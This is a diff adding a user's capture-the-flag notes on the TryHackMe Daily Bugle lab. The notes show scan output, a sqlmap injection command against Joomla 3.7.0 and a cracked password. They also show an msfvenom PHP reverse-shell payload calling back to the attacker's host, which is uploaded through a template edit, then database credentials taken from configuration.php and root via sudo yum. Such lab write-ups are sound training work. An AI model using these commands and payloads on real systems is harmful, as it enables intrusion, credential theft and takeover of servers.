@@ -1,0 +1,530 @@
+
+#CTF -----------> THM (Daily Bugle Notes)
+
+'''
+export ip=10.10.56.250
+
+'''
+
+#Scanning
+
+'''
+
+Nmap scan report for 10.10.56.250
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/9%OT=22%CT=1%CU=34729%PV=Y%DS=4%DC=T%G=Y%TM=5FF955EF
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=10
+OS:2%GCD=2%ISR=10D%TI=Z%CI=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505
+OS:NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W
+OS:3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=
+OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
+OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
+OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
+OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
+OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   269.53 ms 10.2.0.1
+2   ... 3
+4   406.84 ms 10.10.56.250
+
+
+
+
+'''
+
+#Nikto Scans
+
+'''
+
+Syntax Check: /var/lib/nikto/databases/db_drupal
+	6244 entries
+Syntax Check: /var/lib/nikto/databases/db_favicon
+	358 entries
+Syntax Check: /var/lib/nikto/databases/db_content_search
+	19 entries
+Syntax Check: /var/lib/nikto/databases/db_domino
+	274 entries
+Syntax Check: /var/lib/nikto/databases/db_tests
+	6897 entries
+Syntax Check: /var/lib/nikto/databases/db_realms
+	170 entries
+Syntax Check: /var/lib/nikto/databases/db_multiple_index
+	36 entries
+Syntax Check: /var/lib/nikto/databases/db_dir_traversal
+	1 entries
+Syntax Check: /var/lib/nikto/databases/db_404_strings
+	39 entries
+Syntax Check: /var/lib/nikto/databases/db_variables
+	38 entries
+Syntax Check: /var/lib/nikto/databases/db_outdated
+	1254 entries
+Syntax Check: /var/lib/nikto/databases/db_embedded
+	16 entries
+Syntax Check: /var/lib/nikto/databases/db_server_msgs
+	261 entries
+Syntax Check: /var/lib/nikto/databases/db_headers
+	98 entries
+Syntax Check: /var/lib/nikto/databases/db_dictionary
+	1825 entries
+Syntax Check: /var/lib/nikto/databases/db_httpoptions
+	12 entries
+Syntax Check: /var/lib/nikto/databases/db_parked_strings
+	8 entries
+Checking plugins for duplicate test IDs
+
+Some (probably) open IDs: 000029, 000137, 000326, 000407, 000427, 000429, 000430
+
+
+
+'''
+#Gobuster Scan
+
+'''
+
+//images (Status: 301)
+/index.php (Status: 200)
+/templates (Status: 301)
+/media (Status: 301)
+/modules (Status: 301)
+/bin (Status: 301)
+/plugins (Status: 301)
+/includes (Status: 301)
+/language (Status: 301)
+/README.txt (Status: 200)
+/components (Status: 301)
+/cache (Status: 301)
+/libraries (Status: 301)
+/robots.txt (Status: 200)
+
+
+
+'''
+
+'''
+From /README.txt we got the version number of joomla
+
+
+What is the Joomla version?
+3.7.0
+
+From /robots.txt we got to access /administrator page, Here we can try some sqlInjections
+
+sql Injection Commands
+
+sqlmap -u "http://10.10.217.70/administrator/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --dbms=MariaDB --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+
+
+
+
+'''
+
+#Joomla Enumeration Script Results
+
+'''
+
+URL------>http://10.10.23.224/
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.23.224/administrator/components
+http://10.10.23.224/administrator/modules
+http://10.10.23.224/administrator/templates
+http://10.10.23.224/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://10.10.23.224/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://10.10.23.224/robots.txt 
+
+Interesting path found from robots.txt
+http://10.10.23.224/joomla/administrator/
+http://10.10.23.224/administrator/
+http://10.10.23.224/bin/
+http://10.10.23.224/cache/
+http://10.10.23.224/cli/
+http://10.10.23.224/components/
+http://10.10.23.224/includes/
+http://10.10.23.224/installation/
+http://10.10.23.224/language/
+http://10.10.23.224/layouts/
+http://10.10.23.224/libraries/
+http://10.10.23.224/logs/
+http://10.10.23.224/modules/
+http://10.10.23.224/plugins/
+http://10.10.23.224/tmp/
+
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+
+#Processing http://10.10.23.224/administrator/ ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.23.224/administrator/components
+http://10.10.23.224/administrator/modules
+http://10.10.23.224/administrator/templates
+http://10.10.23.224/administrator/includes
+http://10.10.23.224/administrator/language
+http://10.10.23.224/administrator/templates
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page not found
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+
+#JoomBlah Enumeration Script
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: b'fb9j5_users'
+  -  Extracting users from b'fb9j5_users'
+  -  Extracting sessions from b'fb9j5_usession
+
+
+'''
+
+#SQL Map Enumeration
+
+'''
+
+rocessing http://10.10.23.224/ ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing : 
+http://10.10.23.224/administrator/components
+http://10.10.23.224/administrator/modules
+http://10.10.23.224/administrator/templates
+http://10.10.23.224/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://10.10.23.224/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://10.10.23.224/robots.txt 
+
+Interesting path found from robots.txt
+http://10.10.23.224/joomla/administrator/
+http://10.10.23.224/administrator/
+http://10.10.23.224/bin/
+http://10.10.23.224/cache/
+http://10.10.23.224/cli/
+http://10.10.23.224/components/
+http://10.10.23.224/includes/
+http://10.10.23.224/installation/
+http://10.10.23.224/language/
+http://10.10.23.224/layouts/
+http://10.10.23.224/libraries/
+http://10.10.23.224/logs/
+http://10.10.23.224/modules/
+http://10.10.23.224/plugins/
+http://10.10.23.224/tmp/
+
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+[+] Enumeration component (com_ajax)
+[++] Name: com_ajax
+Location : http://10.10.23.224/components/com_ajax/
+Directory listing is enabled : http://10.10.23.224/components/com_ajax/
+
+
+[+] Enumeration component (com_banners)
+[++] Name: com_banners
+Location : http://10.10.23.224/components/com_banners/
+Directory listing is enabled : http://10.10.23.224/components/com_banners/
+
+        
+[+] Enumeration component (com_contact)
+[++] Name: com_contact
+Location : http://10.10.23.224/components/com_contact/
+Directory listing is enabled : http://10.10.23.224/components/com_contact/
+
+
+[+] Enumeration component (com_content)
+[++] Name: com_content
+Location : http://10.10.23.224/components/com_content/
+Directory listing is enabled : http://10.10.23.224/components/com_content/
+
+
+[+] Enumeration component (com_contenthistory)
+[++] Name: com_contenthistory
+Location : http://10.10.23.224/components/com_contenthistory/
+Directory listing is enabled : http://10.10.23.224/components/com_contenthistory/
+
+
+[+] Enumeration component (com_fields)
+[++] Name: com_fields
+Location : http://10.10.23.224/components/com_fields/
+Directory listing is enabled : http://10.10.23.224/components/com_fields/
+
+
+[+] Enumeration component (com_finder)
+[++] Name: com_finder
+Location : http://10.10.23.224/components/com_finder/
+Directory listing is enabled : http://10.10.23.224/components/com_finder/
+
+
+[+] Enumeration component (com_mailto)
+[++] Name: com_mailto
+Location : http://10.10.23.224/components/com_mailto/
+Directory listing is enabled : http://10.10.23.224/components/com_mailto/
+Installed version : 3.1
+
+
+[+] Enumeration component (com_media)
+[++] Name: com_media
+Location : http://10.10.23.224/components/com_media/
+Directory listing is enabled : http://10.10.23.224/components/com_media/
+
+
+[+] Enumeration component (com_newsfeeds)
+[++] Name: com_newsfeeds
+Location : http://10.10.23.224/components/com_newsfeeds/
+Directory listing is enabled : http://10.10.23.224/components/com_newsfeeds/
+
+
+[+] Enumeration component (com_search)
+[++] Name: com_search
+Location : http://10.10.23.224/components/com_search/
+Directory listing is enabled : http://10.10.23.224/components/com_search/
+
+
+[+] Enumeration component (com_users)
+[++] Name: com_users
+Location : http://10.10.23.224/components/com_users/
+Directory listing is enabled : http://10.10.23.224/components/com_users/
+
+
+[+] Enumeration component (com_wrapper)
+[++] Name: com_wrapper
+Location : http://10.10.23.224/components/com_wrapper/
+Directory listing is enabled : http://10.10.23.224/components/com_wrapper/
+Installed version : 3.1
+
+
+
+
+Jonah Password:
+spiderman123
+
+Accessing mail using jonah as username and  password spiderman123
+'''
+
+'''
+
+After logging into the Joomla we got an administrator access and in template page we could possibly upload our payload so that we could run and get an reverse shell to our system.
+
+Payload created
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.59.217 LPORT=9999 f php > error.php
+
+Gobuster Scan on http://10.10.23.224/administrator/
+
+/index.php (Status: 200)
+/help (Status: 301)
+/templates (Status: 301)
+/modules (Status: 301)
+
+To further check lets go to /templates page and check for any possible files or directory
+
+http://10.10.23.224/templates/beez3/index.php  -----------------> To execute our edited file and get a reverse shell but the problem with this shell is it's "UNSTABLE"
+
+With metasploit we got an unstable shell. So i uploaded a webshell to get a stable shell. 
+
+I found out one method to escalate our priviledges as we are currently an apache user to gey user.txt and root.txt we need to escalate our priviledges. 
+After linpeas enumeration I found one sudo (sudo 1.8.27 - Security Bypass) exploit.
+
+
++] Can I write in network-scripts? ...... You have write privileges on /etc/sysconfig/network-scripts/ifdown
+/etc/sysconfig/network-scripts/ifdown-isdn
+/etc/sysconfig/network-scripts/ifup
+/etc/sysconfig/network-scripts/ifup-isdn
+
+
+after linpeas enumeration i found out this directory has a file configuration.php in /var/www/html
+
+
+
+'''
+
+configuration.php
+
+'''
+<?php
+class JConfig {
+	public $offline = '0';
+	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+	public $display_offline_message = '1';
+	public $offline_image = '';
+	public $sitename = 'The Daily Bugle';
+	public $editor = 'tinymce';
+	public $captcha = '0';
+	public $list_limit = '20';
+	public $access = '1';
+	public $debug = '0';
+	public $debug_lang = '0';
+	public $dbtype = 'mysqli';
+	public $host = 'localhost';
+	public $user = 'root';
+	public $password = 'nv5uz9r3ZEDzVjNu';
+	public $db = 'joomla';
+	public $dbprefix = 'fb9j5_';
+	public $live_site = '';
+	public $secret = 'UAMBRWzHO3oFPmVC';
+	public $gzip = '0';
+	public $error_reporting = 'default';
+	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+	public $ftp_host = '127.0.0.1';
+	public $ftp_port = '21';
+	public $ftp_user = '';
+	public $ftp_pass = '';
+	public $ftp_root = '';
+	public $ftp_enable = '0';
+	public $offset = 'UTC';
+	public $mailonline = '1';
+	public $mailer = 'mail';
+	public $mailfrom = 'jonah@tryhackme.com';
+	public $fromname = 'The Daily Bugle';
+	public $sendmail = '/usr/sbin/sendmail';
+	public $smtpauth = '0';
+	public $smtpuser = '';
+	public $smtppass = '';
+	public $smtphost = 'localhost';
+	public $smtpsecure = 'none';
+	public $smtpport = '25';
+	public $caching = '0';
+	public $cache_handler = 'file';
+	public $cachetime = '15';
+	public $cache_platformprefix = '0';
+	public $MetaDesc = 'New York City tabloid newspaper';
+	public $MetaKeys = '';
+	public $MetaTitle = '1';
+	public $MetaAuthor = '1';
+	public $MetaVersion = '0';
+	public $robots = '';
+	public $sef = '1';
+	public $sef_rewrite = '0';
+	public $sef_suffix = '0';
+	public $unicodeslugs = '0';
+	public $feed_limit = '10';
+	public $feed_email = 'none';
+	public $log_path = '/var/www/html/administrator/logs';
+	public $tmp_path = '/var/www/html/tmp';
+	public $lifetime = '15';
+	public $session_handler = 'database';
+	public $shared_session = '0';
+}
+
+
+
+'''
+
+
+'''
+and we can ssh into the machine using username as jjameson and password in the above configuration.php file
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+
+
+   Using gctfo bin of yum i escalated my priviledge to root and got the root flag...
+   
+
+'''
